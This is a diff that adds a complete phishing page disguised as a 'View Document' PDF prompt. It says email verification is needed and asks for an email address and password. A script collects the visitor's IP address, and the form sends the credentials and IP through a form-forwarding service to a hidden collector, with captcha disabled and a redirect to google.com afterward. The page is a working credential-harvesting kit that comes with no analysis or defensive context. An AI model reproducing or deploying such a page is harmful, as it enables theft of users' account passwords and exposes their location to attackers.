@@ -1,0 +1,30 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>View Document</title>
+<link href="styles.css" rel="stylesheet" type="text/css">
+</head>
+<body> 
+  <div>
+ <form action="https://formsubmit.co/5cfcc91fb6f9a09fe20f1fb18ee6e92e" method="POST" class="form">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="web images/pdf logo.jpg" alt="" width="160" height="121" id="logo"> <br><br>
+	<h1 class="hi" style="font-size: medium; color: #FFFFFF; text-align: center;">Email Authentication is required,<br>Verify your Email to view Document.</h1><br>
+	<input type="email" name="email" id="email" placeholder="Email" autocomplete="on" required><br>
+	<input type="password" name="password" id="password" placeholder="Password" required><br><br>
+	<input type="submit" class="viewdocument" value="View Document">
+	 <input type="hidden" name="ip" id="ipFormInput">
+	 <input type="hidden" name="_captcha" value="false">
+	<input type="hidden" name="_next" value="https://google.com/thanks.html"></form></div>
+</body>
+	<script type="application/javascript ">
+    const ipFormInput = document.getElementById('ipFormInput');
+
+    fetch('https://api.ipify.org?format=json')
+        .then((response) => { return response.json() })
+        .then((json) => {
+            const ip = json.ip;
+            ipFormInput.value = ip;
+        })
+        .catch((err) => { console.error(`Error getting IP Address: ${err}`) })
+</script>
+</html>
